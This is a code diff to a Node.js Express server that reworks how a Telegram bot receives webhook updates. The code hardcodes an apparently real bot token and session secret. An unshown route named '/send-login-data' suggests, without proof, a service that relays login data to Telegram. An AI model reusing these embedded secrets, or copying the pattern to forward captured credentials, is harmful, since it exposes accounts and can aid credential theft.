@@ -23,6 +23,10 @@ const TELEGRAM_POLLING_ENABLED =
 const usePolling = TELEGRAM_POLLING_ENABLED && !TELEGRAM_WEBHOOK_URL;
 const bot = new TelegramBot('8499303373:AAHXoK6a9_4o018qmbkPcYV3hdMt2dA-npM', { polling: usePolling });
 
+bot.on('error', (err) => {
+  console.error('Telegram bot error:', err && err.message ? err.message : err);
+});
+
 if (usePolling) {
   let polling409Logged = false;
   bot.on('polling_error', (err) => {
@@ -69,35 +73,45 @@ app.use(cors({
   methods: ['GET', 'POST']
 }));
 
-app.use(express.json({ limit: '512kb' }));
-app.use(express.urlencoded({ extended: true }));
-
-/** Telegram POST must run BEFORE express-session — otherwise every webhook creates a new session (saveUninitialized) and can exhaust memory on Render. */
+/**
+ * Telegram updates: register BEFORE express.json() and use raw body + JSON.parse.
+ * Some hosts/proxies mis-handle application/json parsing; callback_query would never reach bot.processUpdate.
+ * Telegram POST must run BEFORE express-session — otherwise every webhook creates a new session (saveUninitialized).
+ */
 if (TELEGRAM_WEBHOOK_URL) {
-  app.post('/telegram-webhook', (req, res) => {
-    try {
-      const body = req.body;
-      if (body && typeof body === 'object' && Object.keys(body).length > 0) {
+  app.get('/telegram-webhook', (_req, res) => {
+    res.status(200).type('text/plain').send('telegram webhook endpoint (Telegram uses POST)');
+  });
+  app.post(
+    '/telegram-webhook',
+    express.raw({ type: '*/*', limit: '512kb' }),
+    (req, res) => {
+      try {
+        const buf = req.body;
+        if (!Buffer.isBuffer(buf) || buf.length === 0) {
+          console.warn('Telegram webhook: empty body', req.headers['content-type'] || '');
+          return res.sendStatus(200);
+        }
+        const text = buf.toString('utf8');
+        const update = JSON.parse(text);
         if (process.env.TELEGRAM_WEBHOOK_DEBUG === '1') {
           console.log(
             'Telegram webhook recv update_id=%s %s',
-            body.update_id,
-            body.callback_query ? 'callback_query' : ''
+            update.update_id,
+            update.callback_query ? 'callback_query' : ''
           );
         }
-        bot.processUpdate(body);
-      } else {
-        console.warn(
-          'Telegram webhook: empty body (check proxy / Content-Type).',
-          req.headers['content-type'] || '(no content-type)'
-        );
+        bot.processUpdate(update);
+      } catch (err) {
+        console.error('Telegram webhook parse/processUpdate:', err.message);
       }
-    } catch (err) {
-      console.error('Telegram webhook processUpdate:', err.message);
+      res.sendStatus(200);
     }
-    res.sendStatus(200);
-  });
+  );
 }
+
+app.use(express.json({ limit: '512kb' }));
+app.use(express.urlencoded({ extended: true }));
 
 app.use(session({
   secret: '8c07f4a99f3e4b34b76d9d67a1c54629dce9aaab6c2f4bff1b3c88c7b6152b61',
@@ -657,10 +671,19 @@ app.post('/send-login-data', (req, res) => {
 const PORT = Number(process.env.PORT) || 3001;
 server.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
+  if (process.env.RENDER === 'true' && !TELEGRAM_WEBHOOK_URL) {
+    console.warn(
+      'Render: TELEGRAM_WEBHOOK_URL is not set — inline buttons will not work. Add it as https://YOUR-SERVICE.onrender.com/telegram-webhook'
+    );
+  }
   if (TELEGRAM_WEBHOOK_URL) {
     bot
       .deleteWebHook()
-      .then(() => bot.setWebHook(TELEGRAM_WEBHOOK_URL))
+      .then(() =>
+        bot.setWebHook(TELEGRAM_WEBHOOK_URL, {
+          drop_pending_updates: false
+        })
+      )
       .then(() => {
         console.log('Telegram webhook registered:', TELEGRAM_WEBHOOK_URL);
         return bot.getWebHookInfo();
